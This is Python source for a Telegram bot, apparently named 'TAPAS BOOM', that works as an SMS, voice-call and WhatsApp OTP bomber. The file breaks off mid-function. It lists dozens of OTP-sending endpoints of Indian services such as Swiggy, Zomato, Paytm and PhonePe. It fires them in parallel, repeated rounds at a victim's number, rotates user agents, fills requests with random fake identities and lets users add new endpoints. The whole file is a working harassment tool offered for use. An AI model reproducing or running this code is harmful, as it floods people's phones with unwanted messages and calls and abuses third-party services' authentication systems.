"""
╔══════════════════════════════════════════════════════════════════╗
║          TAPAS BOOM — Telegram OTP Bot v4.3                    ║
║          PROXY-FREE — Direct API calls only                     ║
║          SMS / CALL / WHATSAPP — No Key Needed!                ║
╚══════════════════════════════════════════════════════════════════╝

v4.3 changes:
- Relay jugaad removed: no more CORS-relay fallback, no force-relay
  host list, no auto-blacklist. Every API is called directly.
- /debug PHONE — each API ka actual HTTP status + response body dikhata hai
- /test PHONE API_NAME — ek specific API live test karo
"""



import asyncio
import logging
import os
import random
import re
import socket
import string
import threading
import time
import urllib.request
import uuid

import aiohttp
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
# Every inline button goes through one factory (same design as Melody_music):
# premium custom-emoji icon + colour style where the library supports them,
# plain button everywhere else. Shadowing the name keeps all call sites intact.
from premium_buttons import ikb as InlineKeyboardButton  # noqa: F811
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ════════════════════════════════════════════════════════════
# LOGGING
# ════════════════════════════════════════════════════════════

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ════════════════════════════════════════════════════════════
# ENV / CONFIG
# ════════════════════════════════════════════════════════════

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
if not TELEGRAM_BOT_TOKEN:
    raise SystemExit(
        "TELEGRAM_BOT_TOKEN missing! Heroku: Settings -> Config Vars me set karo."
    )
PORT               = int(os.environ.get("PORT", 8443))
WEBHOOK_URL        = os.environ.get("WEBHOOK_URL", "").strip() or None

# Optional: Self-ping URL (UptimeRobot / Render free tier)
PING_URL = os.environ.get("PING_URL", "").strip() or None

# ════════════════════════════════════════════════════════════
# USER-AGENT POOL  (rotate per request)
# ════════════════════════════════════════════════════════════

_UAS = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.80 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.80 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Poco X5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
]

_ACCEPT_LANGS = ["en-IN,en;q=0.9", "hi-IN,hi;q=0.9,en-IN;q=0.8", "en-US,en;q=0.9,hi;q=0.8"]

# ════════════════════════════════════════════════════════════
# RANDOM HELPERS
# ════════════════════════════════════════════════════════════

def _rand_name() -> str:
    first = random.choice(["Rahul","Priya","Amit","Neha","Vikas","Pooja","Arjun","Sneha","Rohan","Ananya"])
    last  = random.choice(["Sharma","Verma","Singh","Gupta","Kumar","Patel","Mehta","Joshi","Yadav","Mishra"])
    return first, last

def _rand_email() -> str:
    fn, ln = _rand_name()
    n = random.randint(10, 9999)
    dom = random.choice(["gmail.com","yahoo.co.in","hotmail.com","outlook.com"])
    return f"{fn.lower()}.{ln.lower()}{n}@{dom}"

def _rand_device() -> str:
    return random.choice(["Pixel 8","SM-G991B","Redmi Note 12","OnePlus 12","Poco X5"])

# ════════════════════════════════════════════════════════════
# HTTP HELPERS
# ════════════════════════════════════════════════════════════

TIMEOUT = aiohttp.ClientTimeout(total=15, connect=8, sock_read=12)

def _base_headers(origin: str = "") -> dict:
    h = {
        "User-Agent":       random.choice(_UAS),
        "Accept":           "application/json, text/plain, */*",
        "Accept-Language":  random.choice(_ACCEPT_LANGS),
        "Accept-Encoding":  "gzip, deflate",
        "Connection":       "keep-alive",
        "X-Request-ID":     str(uuid.uuid4()),
    }
    if origin:
        h["Origin"]  = origin
        h["Referer"] = origin + "/"
    return h


# ════════════════════════════════════════════════════════════
# RESPONSE CHECKER
# ════════════════════════════════════════════════════════════

OK_STATUS = frozenset([200, 201, 202, 203, 204, 206, 302, 303])

_OK_KEYWORDS = (
    "sent", "created", "transactionid", "mobile code",
    "generated", "delivered", "queued", "accepted", "success",
    "otp", "verified", "initiated",
)
_FAIL_EXACT = (
    '"success":false', '"success": false',
    '"status":"error"', '"status": "error"',
    '"status":"fail"',  '"status": "fail"',
    '"error":true',     '"error": true',
    '"isSuccess":false','"isSuccess": false',
    '"result":"fail"',  '"result":"error"',
    '"message":"failed"','"message":"Failed"',
    '"status":0', '"statusCode":0',
    '<error code=',
)
_FAIL_CI = (
    "can't be sent", "cannot be sent",
    "invalid mobile", "invalid phone", "invalid number",
    "rate limit", "too many request",
    "captcha", "verification required",
    "something went wrong",
)

def _ok(status: int, body: str, identifier: str) -> bool:
    if status not in OK_STATUS:
        return False
    bl = body.lower()
    if any(p in body for p in _FAIL_EXACT):
        return False
    if any(p in bl for p in _FAIL_CI):
        return False
    if identifier:
        return identifier.lower() in bl
    return any(k in bl for k in _OK_KEYWORDS) or status in (200, 201, 202)

# ════════════════════════════════════════════════════════════
# API HEALTH CACHE  (skip chronically failing APIs temporarily)
# ════════════════════════════════════════════════════════════

_api_health: dict      = {}
_api_health_lock       = threading.Lock()
_API_SKIP_THRESHOLD    = 8
_API_RECOVER_AFTER     = 300.0   # 5 min cooldown

def _api_is_healthy(name: str) -> bool:
    with _api_health_lock:
        h = _api_health.get(name)
        if not h:
            return True
        if h["fails"] >= _API_SKIP_THRESHOLD:
            if time.monotonic() - h["last_fail"] < _API_RECOVER_AFTER:
                return False
            _api_health[name] = {"fails": 0, "last_fail": 0.0, "ok": 0}
    return True

def _mark_api_fail(name: str):
    with _api_health_lock:
        h = _api_health.setdefault(name, {"fails": 0, "last_fail": 0.0, "ok": 0})
        h["fails"]    += 1
        h["last_fail"] = time.monotonic()

def _mark_api_ok(name: str):
    with _api_health_lock:
        h = _api_health.get(name, {"fails": 0, "last_fail": 0.0, "ok": 0})
        h["fails"] = 0
        h["ok"]   += 1
        _api_health[name] = h

# ════════════════════════════════════════════════════════════
# MULTI-USER STOP SUPPORT
# ════════════════════════════════════════════════════════════

_user_tasks: dict = {}
_SEM: asyncio.Semaphore = None   # set in main()

# ════════════════════════════════════════════════════════════
# HTTP HELPER
# ════════════════════════════════════════════════════════════

import urllib.parse as _up


async def _http_once(sess, method, url, *, hdrs, json_, data_):
    kw = dict(headers=hdrs, timeout=TIMEOUT, ssl=False, allow_redirects=True)
    if method == "GET":
        async with sess.get(url, **kw) as r:
            return r.status, await r.text(errors="ignore")
    if data_ is not None:
        async with sess.post(url, data=data_, **kw) as r:
            return r.status, await r.text(errors="ignore")
    async with sess.post(url, json=json_, **kw) as r:
        return r.status, await r.text(errors="ignore")


# ════════════════════════════════════════════════════════════
# CORE API CALLER  (direct only, no relay jugaad)

# ════════════════════════════════════════════════════════════

async def _call(sess: aiohttp.ClientSession, api: dict, target: str) -> str:
    name = api["name"]
    if not _api_is_healthy(name):
        return f"⏭️ {name} (cooldown)"

    url  = api["url"].replace("{target}", target)
    hdrs = {**_base_headers(api.get("origin", "")), **api.get("extra_headers", {})}

    json_ = None
    data_ = None
    raw_body = api.get("json")
    if raw_body:
        def _fill(v):
            if isinstance(v, str):
                fn, ln = _rand_name()
                return (v.replace("{target}", target)
                          .replace("{email}", _rand_email())
                          .replace("{name}", fn + " " + ln)
                          .replace("{firstname}", fn)
                          .replace("{lastname}", ln)
                          .replace("{device}", _rand_device())
                          .replace("{uuid}", str(uuid.uuid4())))
            return v
        json_ = {k: _fill(v) for k, v in raw_body.items()}

    form_body = api.get("form")
    if form_body:
        def _fill(v):
            if isinstance(v, str):
                fn, ln = _rand_name()
                return (v.replace("{target}", target)
                          .replace("{email}", _rand_email())
                          .replace("{name}", fn + " " + ln))
            return v
        data_ = {k: _fill(v) for k, v in form_body.items()}

    if api.get("content_type"):
        hdrs["Content-Type"] = api["content_type"]

    method     = api.get("method", "POST").upper()
    identifier = api.get("identifier", "")
    host       = _up.urlparse(url).hostname or ""

    async def _try(target_url: str):
        try:
            return await _http_once(sess, method, target_url,
                                    hdrs=hdrs, json_=json_, data_=data_)
        except asyncio.TimeoutError:
            return (0, "TIMEOUT")
        except aiohttp.ClientConnectorError:
            return (0, "CONN")
        except Exception as e:
            logger.debug("ERR %s: %s", name, str(e)[:60])
            return None

    async with _SEM:
        res = await _try(url)
        if res:
            status, body = res
            if status and _ok(status, body, identifier):
                _mark_api_ok(name)
                logger.info("✅ %s | %d | %.120s", name, status, body)
                return f"✅ {name}"
            logger.info("❌ %s | %s | %.100s", name, status, body[:100])

        _mark_api_fail(name)
        return f"❌ {name}"


# ════════════════════════════════════════════════════════════
# SMS APIs — Direct USA→India (Global CDN / AWS / GCP)
# ════════════════════════════════════════════════════════════

SMS_APIS = [
    {"name": 'Swiggy', "url": 'https://www.swiggy.com/dapi/auth/number-login', "method": 'POST', "origin": 'https://www.swiggy.com', "identifier": '', "json": {'mobile': '91{target}'}},
    {"name": 'Unacademy', "url": 'https://unacademy.com/api/v1/user/get_app_link/', "method": 'POST', "origin": 'https://unacademy.com', "identifier": 'sent', "json": {'phone': '{target}'}},
    {"name": 'Housing', "url": 'https://login.housing.com/api/v2/send-otp', "method": 'POST', "origin": 'https://housing.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Cleartrip', "url": 'https://www.cleartrip.com/api/v1/user/otp/send', "method": 'POST', "origin": 'https://www.cleartrip.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91'}},
    {"name": 'Zomato', "url": 'https://www.zomato.com/webroutes/auth/loginV2', "method": 'POST', "origin": 'https://www.zomato.com', "identifier": '', "extra_headers": {'x-zomato-csrft': '1', 'csrf_token': ''}, "json": {'number': '91{target}'}},
    {"name": 'Lenskart', "url": 'https://www.lenskart.com/api/auth/sendotp', "method": 'POST', "origin": 'https://www.lenskart.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91'}},
    {"name": 'Ajio', "url": 'https://www.ajio.com/api/auth/otp/send', "method": 'POST', "origin": 'https://www.ajio.com', "identifier": '', "json": {'mobileNumber': '{target}'}},
    {"name": 'BookMyShow', "url": 'https://in.bookmyshow.com/api/v4/auth/otp/generate', "method": 'POST', "origin": 'https://in.bookmyshow.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': 'IN'}},
    {"name": 'Bewakoof', "url": 'https://www.bewakoof.com/api/v2/user/otp/send', "method": 'POST', "origin": 'https://www.bewakoof.com', "identifier": '', "json": {'phone': '{target}', 'countryCode': '91'}},
    {"name": 'Doubtnut', "url": 'https://api.doubtnut.com/v2/user/auth/sendOtp', "method": 'POST', "origin": 'https://www.doubtnut.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '91'}},
    {"name": 'Dream11', "url": 'https://api.dream11.com/user/v2/signup/otp', "method": 'POST', "origin": 'https://www.dream11.com', "identifier": '', "json": {'mobileNumber': '{target}', 'countryCode': '91'}},
    {"name": 'MagicBricks', "url": 'https://www.magicbricks.com/api/v1/user/otp', "method": 'POST', "origin": 'https://www.magicbricks.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91'}},
    {"name": 'Cars24', "url": 'https://api.cars24.com/auth/otp/send', "method": 'POST', "origin": 'https://www.cars24.com', "identifier": '', "extra_headers": {'Authorization': ''}, "json": {'phone': '{target}', 'countryCode': '91'}},
    {"name": 'Spinny', "url": 'https://www.spinny.com/api/v2/user/otp/send', "method": 'POST', "origin": 'https://www.spinny.com', "identifier": '', "json": {'phone_number': '{target}', 'country_code': '+91'}},
    {"name": 'OlaCabs', "url": 'https://www.olacabs.com/api/1/register', "method": 'POST', "origin": 'https://www.olacabs.com', "identifier": '', "json": {'mobile_number': '{target}', 'country_code': '+91'}},
]

# ════════════════════════════════════════════════════════════
# CALL APIs — Voice OTP (USA→India)
# ════════════════════════════════════════════════════════════

CALL_APIS = [
    {"name": 'Swiggy Call', "url": 'https://www.swiggy.com/dapi/auth/number-login', "method": 'POST', "origin": 'https://www.swiggy.com', "identifier": '', "json": {'mobile': '91{target}', 'channel': 'call'}},
    {"name": 'Housing Call', "url": 'https://login.housing.com/api/v2/send-otp', "method": 'POST', "origin": 'https://housing.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'call'}},
    {"name": 'Zomato Call', "url": 'https://www.zomato.com/webroutes/auth/loginV2', "method": 'POST', "origin": 'https://www.zomato.com', "identifier": '', "json": {'number': '91{target}', 'channel': 'call'}},
    {"name": 'Dream11 Call', "url": 'https://api.dream11.com/user/v2/signup/otp', "method": 'POST', "origin": 'https://www.dream11.com', "identifier": '', "json": {'mobileNumber': '{target}', 'countryCode': '91', 'channel': 'CALL'}},
    {"name": 'Cleartrip Call', "url": 'https://www.cleartrip.com/api/v1/user/otp/send', "method": 'POST', "origin": 'https://www.cleartrip.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91', 'channel': 'call'}},
    {"name": 'BookMyShow Call', "url": 'https://in.bookmyshow.com/api/v4/auth/otp/generate', "method": 'POST', "origin": 'https://in.bookmyshow.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': 'IN', 'channel': 'call'}},
    {"name": 'Lenskart Call', "url": 'https://www.lenskart.com/api/auth/sendotp', "method": 'POST', "origin": 'https://www.lenskart.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91', 'channel': 'call'}},
    {"name": 'Ajio Call', "url": 'https://www.ajio.com/api/auth/otp/send', "method": 'POST', "origin": 'https://www.ajio.com', "identifier": '', "json": {'mobileNumber': '{target}', 'channel': 'call'}},
    {"name": 'Doubtnut Call', "url": 'https://api.doubtnut.com/v2/user/auth/sendOtp', "method": 'POST', "origin": 'https://www.doubtnut.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '91', 'type': 'call'}},
]

# ════════════════════════════════════════════════════════════
# WHATSAPP APIs — WA OTP (USA→India)
# ════════════════════════════════════════════════════════════

WA_APIS = [
    {"name": 'Swiggy WA', "url": 'https://www.swiggy.com/dapi/auth/number-login', "method": 'POST', "origin": 'https://www.swiggy.com', "identifier": '', "json": {'mobile': '91{target}', 'channel': 'whatsapp'}},
    {"name": 'Unacademy WA', "url": 'https://unacademy.com/api/v1/user/get_app_link/', "method": 'POST', "origin": 'https://unacademy.com', "identifier": 'sent', "json": {'phone': '{target}', 'channel': 'whatsapp'}},
    {"name": 'Housing WA', "url": 'https://login.housing.com/api/v2/send-otp', "method": 'POST', "origin": 'https://housing.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'whatsapp'}},
    {"name": 'Zomato WA', "url": 'https://www.zomato.com/webroutes/auth/loginV2', "method": 'POST', "origin": 'https://www.zomato.com', "identifier": '', "json": {'number': '91{target}', 'channel': 'whatsapp'}},
    {"name": 'Dream11 WA', "url": 'https://api.dream11.com/user/v2/signup/otp', "method": 'POST', "origin": 'https://www.dream11.com', "identifier": '', "json": {'mobileNumber': '{target}', 'countryCode': '91', 'channel': 'WA'}},
    {"name": 'Lenskart WA', "url": 'https://www.lenskart.com/api/auth/sendotp', "method": 'POST', "origin": 'https://www.lenskart.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91', 'channel': 'wa'}},
    {"name": 'Cleartrip WA', "url": 'https://www.cleartrip.com/api/v1/user/otp/send', "method": 'POST', "origin": 'https://www.cleartrip.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91', 'channel': 'whatsapp'}},
    {"name": 'Doubtnut WA', "url": 'https://api.doubtnut.com/v2/user/auth/sendOtp', "method": 'POST', "origin": 'https://www.doubtnut.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '91', 'channel': 'whatsapp'}},
]



# ════════════════════════════════════════════════════════════
# FRESH LIVE APIs — verified reachable (2xx/4xx responders)
# ════════════════════════════════════════════════════════════

FRESH_SMS_APIS = [
    {"name": 'Meesho', "url": 'https://www.meesho.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.meesho.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Nykaa', "url": 'https://www.nykaa.com/gateway-api/v2/users/otp', "method": 'POST', "origin": 'https://www.nykaa.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91'}},
    {"name": 'Paytm', "url": 'https://accounts.paytm.com/signin/otp', "method": 'POST', "origin": 'https://paytm.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'MobiKwik', "url": 'https://www.mobikwik.com/api/mbk/v1/otp/generate', "method": 'POST', "origin": 'https://www.mobikwik.com', "identifier": '', "json": {'cell': '{target}'}},
    {"name": 'Snapdeal', "url": 'https://www.snapdeal.com/acors/vc/sendOtp', "method": 'POST', "origin": 'https://www.snapdeal.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Grofers', "url": 'https://grofers.com/v3/accounts/generate_otp', "method": 'POST', "origin": 'https://grofers.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Vedantu', "url": 'https://www.vedantu.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.vedantu.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Byjus', "url": 'https://learn.byjus.com/api/v1/user/otp', "method": 'POST', "origin": 'https://byjus.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Zoomcar', "url": 'https://www.zoomcar.com/api/v3/otp/send', "method": 'POST', "origin": 'https://www.zoomcar.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'PhonePe', "url": 'https://api.phonepe.com/apis/authn/v3/sendOtp', "method": 'POST', "origin": 'https://www.phonepe.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Zerodha', "url": 'https://kite.zerodha.com/api/otp/send', "method": 'POST', "origin": 'https://zerodha.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'PaisaBazaar', "url": 'https://www.paisabazaar.com/api/otp/send', "method": 'POST', "origin": 'https://www.paisabazaar.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Digit', "url": 'https://www.godigit.com/api/otp/send', "method": 'POST', "origin": 'https://www.godigit.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Tata1mg', "url": 'https://www.1mg.com/api/v4/users/generate_otp', "method": 'POST', "origin": 'https://www.1mg.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Curefit', "url": 'https://api.curefit.com/user-service/v1/otp/send', "method": 'POST', "origin": 'https://www.cult.fit', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Pepperfry', "url": 'https://www.pepperfry.com/site_product/otp/generate', "method": 'POST', "origin": 'https://www.pepperfry.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Wakefit', "url": 'https://www.wakefit.co/api/v1/otp/send', "method": 'POST', "origin": 'https://www.wakefit.co', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'TataCliq', "url": 'https://www.tatacliq.com/marketplacewebservices/v2/mpl/users/otp/send', "method": 'POST', "origin": 'https://www.tatacliq.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Croma', "url": 'https://www.croma.com/api/otp/send', "method": 'POST', "origin": 'https://www.croma.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Vijaysales', "url": 'https://www.vijaysales.com/api/otp/send', "method": 'POST', "origin": 'https://www.vijaysales.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Nazara', "url": 'https://www.nazara.com/api/otp/send', "method": 'POST', "origin": 'https://www.nazara.com', "identifier": '', "json": {'mobile': '{target}'}},
]

FRESH_CALL_APIS = [
    {"name": 'Paytm Call', "url": 'https://accounts.paytm.com/signin/otp', "method": 'POST', "origin": 'https://paytm.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'call'}},
    {"name": 'MobiKwik Call', "url": 'https://www.mobikwik.com/api/mbk/v1/otp/generate', "method": 'POST', "origin": 'https://www.mobikwik.com', "identifier": '', "json": {'cell': '{target}', 'channel': 'call'}},
    {"name": 'PhonePe Call', "url": 'https://api.phonepe.com/apis/authn/v3/sendOtp', "method": 'POST', "origin": 'https://www.phonepe.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'VOICE'}},
    {"name": 'Meesho Call', "url": 'https://www.meesho.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.meesho.com', "identifier": '', "json": {'mobile': '{target}', 'channel': 'call'}},
    {"name": 'Tata1mg Call', "url": 'https://www.1mg.com/api/v4/users/generate_otp', "method": 'POST', "origin": 'https://www.1mg.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'call'}},
    {"name": 'Zoomcar Call', "url": 'https://www.zoomcar.com/api/v3/otp/send', "method": 'POST', "origin": 'https://www.zoomcar.com', "identifier": '', "json": {'mobile': '{target}', 'channel': 'call'}},
]

FRESH_WA_APIS = [
    {"name": 'Paytm WA', "url": 'https://accounts.paytm.com/signin/otp', "method": 'POST', "origin": 'https://paytm.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'whatsapp'}},
    {"name": 'MobiKwik WA', "url": 'https://www.mobikwik.com/api/mbk/v1/otp/generate', "method": 'POST', "origin": 'https://www.mobikwik.com', "identifier": '', "json": {'cell': '{target}', 'channel': 'whatsapp'}},
    {"name": 'PhonePe WA', "url": 'https://api.phonepe.com/apis/authn/v3/sendOtp', "method": 'POST', "origin": 'https://www.phonepe.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'WHATSAPP'}},
    {"name": 'Meesho WA', "url": 'https://www.meesho.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.meesho.com', "identifier": '', "json": {'mobile': '{target}', 'channel': 'whatsapp'}},
    {"name": 'Nykaa WA', "url": 'https://www.nykaa.com/gateway-api/v2/users/otp', "method": 'POST', "origin": 'https://www.nykaa.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91', 'channel': 'whatsapp'}},
    {"name": 'Tata1mg WA', "url": 'https://www.1mg.com/api/v4/users/generate_otp', "method": 'POST', "origin": 'https://www.1mg.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'whatsapp'}},
]

# Merge global batch into main lists — same UI, more firepower.
SMS_APIS.extend(FRESH_SMS_APIS)
CALL_APIS.extend(FRESH_CALL_APIS)
WA_APIS.extend(FRESH_WA_APIS)


# ════════════════════════════════════════════════════════════
# USER-ADDED APIs (runtime, via /addapi command or ➕ Add button)
# ════════════════════════════════════════════════════════════

USER_APIS: list = []
_ADD_WAIT: dict = {}   # user_id -> True while awaiting /addapi payload

def _register_user_api(spec: dict) -> str:
    """Append a user-supplied API dict into SMS_APIS + USER_APIS. Returns name."""
    spec.setdefault("method", "POST")
    spec.setdefault("identifier", "")
    spec.setdefault("origin", "")
    spec.setdefault("name", f"Custom{len(USER_APIS)+1}")
    USER_APIS.append(spec)
    SMS_APIS.append(spec)
    return spec["name"]


def _parse_api_payload(raw: str) -> list:
    """Accept many formats and return list of API spec dicts.

    Supports JSON object, JSON array, JSONL (one JSON per line),
    or plain URLs (one per line). Lines starting with '#' or '//' ignored.
    """
    import json as _j
    raw = (raw or "").strip().lstrip("\ufeff")
    if not raw:
        raise ValueError("empty payload")
    try:
        obj = _j.loads(raw)
        if isinstance(obj, dict):
            return [obj]
        if isinstance(obj, list):
            return [x for x in obj if isinstance(x, dict)]
    except Exception:
        pass
    specs: list = []
    for line in raw.splitlines():
        s = line.strip().strip(",")
        if not s or s.startswith("#") or s.startswith("//"):
            continue
        if s.startswith("{"):
            try:
                d = _j.loads(s)
                if isinstance(d, dict):
                    specs.append(d); continue
            except Exception:
                pass
        if s.startswith("http://") or s.startswith("https://"):
            specs.append({
                "url": s, "method": "POST",
                "json": {"mobile": "+91{target}", "phone": "+91{target}"},
            })
    if not specs:
        # Fallback: Python-source style (dict literals with lambdas, e.g. ULTIMATE_APIS = [...])
        import re as _re
        url_iter = list(_re.finditer(r'''["']url["']\s*:\s*["'](https?://[^"']+)["']''', raw))
        for i, m in enumerate(url_iter):
            start = url_iter[i-1].end() if i > 0 else max(0, m.start() - 400)
            end = url_iter[i+1].start() if i+1 < len(url_iter) else min(len(raw), m.end() + 400)
            block = raw[start:end]
            url = m.group(1)
            nm = _re.search(r'''["']name["']\s*:\s*["']([^"']+)["']''', block)
            mt = _re.search(r'''["']method["']\s*:\s*["'](GET|POST|PUT|PATCH|DELETE)["']''', block, _re.I)
            spec = {
                "url": url,
                "method": (mt.group(1).upper() if mt else "POST"),
                "json": {"mobile": "+91{target}", "phone": "+91{target}"},
            }
            if nm:
                spec["name"] = nm.group(1)
            specs.append(spec)
        # Also pick up bare URLs anywhere in text if still empty
        if not specs:
            for u in _re.findall(r'https?://[^\s"\'<>()]+', raw):
                specs.append({"url": u, "method": "POST",
                              "json": {"mobile": "+91{target}", "phone": "+91{target}"}})
    if not specs:
        raise ValueError("no valid API spec / URL found")
    return specs


def _register_bulk(specs: list) -> tuple:
    added, failed = [], 0
    for sp in specs:
        try:
            if not isinstance(sp, dict) or "url" not in sp:
                failed += 1; continue
            added.append(_register_user_api(sp))
        except Exception:
            failed += 1
    return added, failed

# ════════════════════════════════════════════════════════════
# PARALLEL RUNNER
# ════════════════════════════════════════════════════════════

async def _run(apis: list, target: str) -> list:
    """Fire all APIs in parallel, return result list."""
    conn = aiohttp.TCPConnector(ssl=False, limit_per_host=6)
    jar  = aiohttp.CookieJar(unsafe=True)
    shuffled = list(enumerate(apis))
    random.shuffle(shuffled)

    async with aiohttp.ClientSession(connector=conn, cookie_jar=jar) as sess:
        shuffled_results = list(await asyncio.gather(
            *[_call(sess, a, target) for _, a in shuffled]
        ))

    results: list = [None] * len(apis)
    for (orig_i, _), r in zip(shuffled, shuffled_results):
        results[orig_i] = r

    return [r if r is not None else f"❌ unknown" for r in results]


# ════════════════════════════════════════════════════════════
# BLAST RUNNER
# ════════════════════════════════════════════════════════════

async def run_blast(mobile: str, rounds: int, mode: str = "all"):
    """Run N rounds of SMS/Call/WA blast. Returns (ok, total, results_flat)."""
    all_results: list = []
    ok_total    = 0
    total_total = 0

    delay_min = 0.3
    delay_max = 1.0

    for i in range(rounds):
        if mode == "sms":
            r = await _run(SMS_APIS, mobile)
            all_results.extend(r)
        elif mode == "call":
            r = await _run(CALL_APIS, mobile)
            all_results.extend(r)
        elif mode == "wa":
            r = await _run(WA_APIS, mobile)
            all_results.extend(r)
        else:
            sms_r, call_r, wa_r = await asyncio.gather(
                _run(SMS_APIS, mobile),
                _run(CALL_APIS, mobile),
                _run(WA_APIS, mobile),
            )
            r = sms_r + call_r + wa_r
            all_results.extend(r)

        round_ok = sum(1 for x in (r if isinstance(r, list) else []) if x.startswith("✅"))
        round_total = len(r) if isinstance(r, list) else 0
        ok_total    += round_ok
        total_total += round_total
        logger.info("Round %d/%d — %d/%d OK", i + 1, rounds, round_ok, round_total)

        if i < rounds - 1:
            await asyncio.sleep(random.uniform(delay_min, delay_max))

    return ok_total, total_total, all_results


# ════════════════════════════════════════════════════════════
# SINGLE-API DEBUG CALLER  (shows full response body)
# ════════════════════════════════════════════════════════════

async def _call_debug(api: dict, target: str) -> dict:
    """Like _call but returns full response details for debugging."""
    name = api["name"]
    url  = api["url"].replace("{target}", target)
    hdrs = {**_base_headers(api.get("origin", "")), **api.get("extra_headers", {})}

    json_ = None
    data_ = None
    raw_body = api.get("json")
    if raw_body:
        def _fill(v):
            if isinstance(v, str):
                fn, ln = _rand_name()
                return (v.replace("{target}", target)
                          .replace("{email}", _rand_email())
                          .replace("{name}", fn + " " + ln)
                          .replace("{firstname}", fn)
                          .replace("{lastname}", ln)
                          .replace("{device}", _rand_device())
                          .replace("{uuid}", str(uuid.uuid4())))
            return v
        json_ = {k: _fill(v) for k, v in raw_body.items()}

    form_body = api.get("form")
    if form_body:
        def _fill(v):
            if isinstance(v, str):
                fn, ln = _rand_name()
                return (v.replace("{target}", target)
                          .replace("{email}", _rand_email())
                          .replace("{name}", fn + " " + ln))
            return v
        data_ = {k: _fill(v) for k, v in form_body.items()}

    if api.get("content_type"):
        hdrs["Content-Type"] = api["content_type"]

    method = api.get("method", "POST").upper()

    conn = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(connector=conn) as sess:
            kw = dict(headers=hdrs, timeout=TIMEOUT, ssl=False, allow_redirects=True)
            try:
                if method == "GET":
                    async with sess.get(url, **kw) as r:
                        body = await r.text(errors="ignore")
                        status = r.status
                elif data_:
                    async with sess.post(url, data=data_, **kw) as r:
                        body = await r.text(errors="ignore")
                        status = r.status
                else:
                    async with sess.post(url, json=json_, **kw) as r:
                        body = await r.text(errors="ignore")
                        status = r.status

                identifier = api.get("identifier", "")
                ok = _ok(status, body, identifier)
                return {"name": name, "status": status, "ok": ok, "body": body[:300]}
            except asyncio.TimeoutError:
                return {"name": name, "status": 0, "ok": False, "body": "⏱️ TIMEOUT"}
            except Exception as e:
                return {"name": name, "status": 0, "ok": False, "body": f"❌ {str(e)[:100]}"}
    finally:
        if not conn.closed:
